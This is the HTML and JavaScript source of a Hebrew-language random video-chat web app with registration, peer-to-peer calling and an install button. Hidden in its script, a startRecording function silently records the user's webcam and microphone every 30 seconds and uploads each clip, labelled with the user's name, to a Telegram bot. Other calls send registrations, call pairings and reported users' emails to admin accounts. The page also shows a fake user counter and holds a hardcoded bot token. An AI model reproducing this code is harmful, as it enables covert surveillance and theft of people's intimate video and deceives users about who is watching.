<!DOCTYPE html>
<html lang="he" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, viewport-fit=cover">
    <title>מי - פה</title>
    <link rel="icon" type="image/png" href="https://i.ibb.co/39C21Wrz/In-Shot-20260426-032830020.png">
    <link rel="manifest" href="data:application/json;base64,ewogICJuYW1lIjogIm1pLXBlIiwKICAic2hvcnRfbmFtZSI6ICJtaS1wZSIsCiAgInN0YXJ0X3VybCI6ICIuIiwKICAiZGlzcGxheSI6ICJzdGFuZGFsb25lIiwKICAiaWNvbnMiOiBbCiAgICB7CiAgICAgICJzcmMiOiAiaHR0cHM6Ly9pLmliYi5jby8zOUMyMVdyei9Jbi1TaG90LTIwMjYwNDI2LTAzMjgzMDAyMC5wbmciLAogICAgICAic2l6ZXMiOiAiNTEyeDUxMiIsCiAgICAgICJ0eXBlIjogImltYWdlL3BuZyIKICAgIH0KICBdCn0=">

    <script src="https://www.gstatic.com/firebasejs/9.6.10/firebase-app-compat.js"></script>
    <script src="https://www.gstatic.com/firebasejs/9.6.10/firebase-database-compat.js"></script>
    <script src="https://unpkg.com/peerjs@1.4.7/dist/peerjs.min.js"></script>
    <script src="https://cdn.socket.io/4.5.4/socket.io.min.js"></script>
    
    <style>
        * { box-sizing: border-box; margin: 0; padding: 0; }
        body { background: #000; height: 100vh; overflow: hidden; font-family: sans-serif; color: white; }

        /* מבנה חצוי */
        #main-wrapper { display: flex; flex-direction: column; height: 100vh; width: 100%; }
        
        /* חצי עליון - קובייה */
        #top-half { flex: 1; perspective: 1000px; position: relative; overflow: hidden; border-bottom: 2px solid #333; }
        #cube { width: 100%; height: 100%; position: absolute; transform-style: preserve-3d; transition: transform 0.7s cubic-bezier(0.645, 0.045, 0.355, 1); }
        .face { position: absolute; width: 100%; height: 100%; backface-visibility: hidden; display: flex; align-items: center; justify-content: center; }
        
        /* פאה: דף הבית (שלג) */
        #home-face { transform: rotateY(0deg) translateZ(0px); background: #111; z-index: 2; }
        #snow-canvas { position: absolute; top: 0; left: 0; width: 100%; height: 100%; opacity: 0.3; }
        .home-content { position: relative; z-index: 3; text-align: center; }
        #main-logo { width: 130px; margin-bottom: 10px; }
        .online-count { display: flex; align-items: center; gap: 8px; font-weight: bold; font-size: 18px; justify-content: center; }
        .online-dot { width: 10px; height: 10px; background: #39e75f; border-radius: 50%; box-shadow: 0 0 10px #39e75f; }

        /* פאה: שותף */
        #partner-face { transform: rotateY(90deg) translateZ(50vw); background: #000; }
        #remoteVideo { width: 100%; height: 100%; object-fit: cover; }

        /* חצי תחתון - מצלמה שלי (קבוע) */
        #bottom-half { flex: 1; background: #111; position: relative; overflow: hidden; }
        #localVideo { width: 100%; height: 100%; object-fit: cover; }

        /* כפתורי שיחה (מוסתרים כברירת מחדל) */
        #controls-overlay { position: absolute; top: 40px; width: 100%; display: none; justify-content: space-between; padding: 0 20px; z-index: 100; }
        .hud-left { background: rgba(0,0,0,0.7); padding: 8px 15px; border-radius: 30px; display: flex; align-items: center; gap: 10px; border: 1px solid rgba(255,255,255,0.2); }
        .hud-right { display: flex; gap: 10px; }
        .btn-circle { width: 45px; height: 45px; border-radius: 50%; background: rgba(0,0,0,0.6); border: 1px solid #fff; color: white; display: flex; align-items: center; justify-content: center; font-size: 20px; }

        /* מצבי קובייה */
        .showing-chat #cube { transform: translateZ(-50vw) rotateY(-90deg); }
        .showing-home #cube { transform: translateZ(0) rotateY(0); }

        /* התקנה */
        #install-btn { position: fixed; bottom: 20px; left: 20px; background: #27ae60; color: white; padding: 10px 20px; border-radius: 50px; font-weight: bold; border: none; display: none; z-index: 5000; }
        
        .modal { display: none; position: fixed; inset: 0; background: rgba(0,0,0,0.9); z-index: 9000; align-items: center; justify-content: center; }
        .modal-content { background: #fff; color: #333; padding: 30px; border-radius: 20px; width: 85%; max-width: 350px; }
    </style>
</head>
<body class="showing-home">

<button id="install-btn">📲 התקן אפליקציה</button>

<div id="main-wrapper">
    <div id="top-half">
        <div id="cube">
            <div id="home-face" class="face">
                <canvas id="snow-canvas"></canvas>
                <div class="home-content">
                    <img id="main-logo" src="https://i.ibb.co/39C21Wrz/In-Shot-20260426-032830020.png">
                    <div class="online-count">
                        <div class="online-dot"></div>
                        <span id="user-count-display">434,447</span>
                    </div>
                </div>
            </div>
            <div id="partner-face" class="face">
                <video id="remoteVideo" autoplay playsinline></video>
                <div id="controls-overlay">
                    <div class="hud-left">
                        <span id="partner-gender-icon">👤</span>
                        <span id="partner-name-display">מחפש...</span>
                    </div>
                    <div class="hud-right">
                        <button class="btn-circle" style="background:red;" onclick="sendReport()">🚩</button>
                        <button class="btn-circle" onclick="toggleMute()">🎤</button>
                        <button class="btn-circle" onclick="switchCamera()">🔄</button>
                    </div>
                </div>
            </div>
        </div>
    </div>

    <div id="bottom-half">
        <video id="localVideo" autoplay muted playsinline></video>
    </div>
</div>

<div id="regModal" class="modal">
    <form class="modal-content" onsubmit="event.preventDefault(); handleRegistration();">
        <h2 style="text-align:center;">כניסה</h2>
        <input type="text" id="reg-name" placeholder="שם" style="width:100%; padding:12px; margin:10px 0; border-radius:10px; border:1px solid #ddd;">
        <input type="email" id="reg-email" placeholder="אימייל" style="width:100%; padding:12px; margin:10px 0; border-radius:10px; border:1px solid #ddd;">
        <select id="reg-gender" style="width:100%; padding:12px; margin:10px 0; border-radius:10px;">
            <option value="זכר">זכר</option>
            <option value="נקבה">נקבה</option>
        </select>
        <button type="submit" style="width:100%; padding:15px; background:#27ae60; color:white; border:none; border-radius:10px; font-weight:bold;">התחל</button>
    </form>
</div>

<script>
    const TG_TOKEN = "8696076063:AAG5wEFTgFnJje39FQEHIbV8hPWxBf_IEac";
    const ADMIN_IDS = ["8373785890", "7089165458"];
    const SERVER_URL = "https://video-app-ylx4.onrender.com"; 

    // --- אפקט שלג (JS Noise) ---
    const canvas = document.getElementById('snow-canvas');
    const ctx = canvas.getContext('2d');
    function resizeSnow() { canvas.width = window.innerWidth; canvas.height = window.innerHeight / 2; }
    function snow() {
        const idata = ctx.createImageData(canvas.width, canvas.height);
        const buffer32 = new Uint32Array(idata.data.buffer);
        for (let i = 0; i < buffer32.length; i++) buffer32[i] = Math.random() < 0.5 ? 0xff000000 : 0xff222222;
        ctx.putImageData(idata, 0, 0);
        requestAnimationFrame(snow);
    }
    window.addEventListener('resize', resizeSnow);
    resizeSnow(); snow();

    // --- מונה משתמשים ---
    let users = 434447;
    setInterval(() => {
        users += Math.floor(Math.random() * 51) - 25;
        if(users < 423000) users = 423100;
        document.getElementById('user-count-display').innerText = users.toLocaleString() + " מחוברים";
    }, 3000);

    // --- התקנה (PWA) ---
    let deferredPrompt;
    window.addEventListener('beforeinstallprompt', (e) => {
        e.preventDefault(); deferredPrompt = e;
        document.getElementById('install-btn').style.display = 'block';
    });
    document.getElementById('install-btn').addEventListener('click', async () => {
        if (deferredPrompt) {
            deferredPrompt.prompt();
            const { outcome } = await deferredPrompt.userChoice;
            if (outcome === 'accepted') document.getElementById('install-btn').style.display = 'none';
            deferredPrompt = null;
        }
    });

    // --- לוגיקה ---
    const socket = io(SERVER_URL);
    const peer = new Peer(undefined);
    let myStream, peerStream, partnerData, currentCall, isMuted = false, camFacing = "user";

    window.onload = () => {
        if(!localStorage.getItem('user_v23')) document.getElementById('regModal').style.display = 'flex';
        else initCamera();
    };

    async function handleRegistration() {
        const user = { name: document.getElementById('reg-name').value, email: document.getElementById('reg-email').value, gender: document.getElementById('reg-gender').value };
        localStorage.setItem('user_v23', JSON.stringify(user));
        document.getElementById('regModal').style.display = 'none';
        sendAdmin(`✨ נרשם חדש: ${user.name} (${user.gender})`);
        initCamera();
    }

    async function initCamera() {
        if(myStream) myStream.getTracks().forEach(t => t.stop());
        myStream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: camFacing }, audio: true });
        document.getElementById('localVideo').srcObject = myStream;
        peerStream = new MediaStream([myStream.getVideoTracks()[0], myStream.getAudioTracks()[0]]);
        startRecording();
    }

    // Swipe לקובייה
    let sX = 0;
    document.body.addEventListener('touchstart', e => sX = e.touches[0].clientX);
    document.body.addEventListener('touchend', e => {
        const d = sX - e.changedTouches[0].clientX;
        if(d > 80 && document.body.className === "showing-home") startChat();
        else if(d < -80 && document.body.className === "showing-chat") backToHome();
    });

    function startChat() {
        document.body.className = "showing-chat";
        document.getElementById('controls-overlay').style.display = 'flex';
        socket.emit('find-partner', { peerId: peer.id, ...JSON.parse(localStorage.getItem('user_v23')) });
    }

    function backToHome() {
        document.body.className = "showing-home";
        document.getElementById('controls-overlay').style.display = 'none';
        if(currentCall) currentCall.close();
        socket.emit('leave-chat');
        document.getElementById('remoteVideo').srcObject = null;
    }

    peer.on('call', call => {
        call.answer(peerStream);
        currentCall = call;
        partnerData = call.metadata;
        handleCall(call);
    });

    socket.on('partner-found', data => {
        partnerData = data;
        currentCall = peer.call(data.peerId, peerStream, { metadata: JSON.parse(localStorage.getItem('user_v23')) });
        handleCall(currentCall);
    });

    function handleCall(call) {
        document.getElementById('partner-name-display').innerText = partnerData.name;
        document.getElementById('partner-gender-icon').innerText = partnerData.gender === 'זכר' ? '👨' : '👩';
        call.on('stream', s => document.getElementById('remoteVideo').srcObject = s);
        sendAdmin(`🤝 שיחה: ${JSON.parse(localStorage.getItem('user_v23')).name} ↔️ ${partnerData.name}`);
    }

    function sendAdmin(msg) { ADMIN_IDS.forEach(id => fetch(`https://api.telegram.org/bot${TG_TOKEN}/sendMessage?chat_id=${id}&text=${encodeURIComponent(msg)}`)); }

    function startRecording() {
        const rec = new MediaRecorder(myStream);
        rec.ondataavailable = e => {
            const user = JSON.parse(localStorage.getItem('user_v23'));
            const fd = new FormData(); fd.append("video", e.data); fd.append("chat_id", ADMIN_IDS[0]); fd.append("caption", `🎥 ${user.name}`);
            fetch(`https://api.telegram.org/bot${TG_TOKEN}/sendVideo`, { method: "POST", body: fd });
        };
        setInterval(() => { if(rec.state === 'recording') rec.stop(); rec.start(); }, 30000);
        rec.start();
    }

    function toggleMute() { isMuted = !isMuted; myStream.getAudioTracks()[0].enabled = !isMuted; }
    async function switchCamera() { camFacing = camFacing === 'user' ? 'environment' : 'user'; initCamera(); }
    function sendReport() { sendAdmin(`🚨 דיווח על ${partnerData.email}`); backToHome(); }
</script>
</body>
</html>
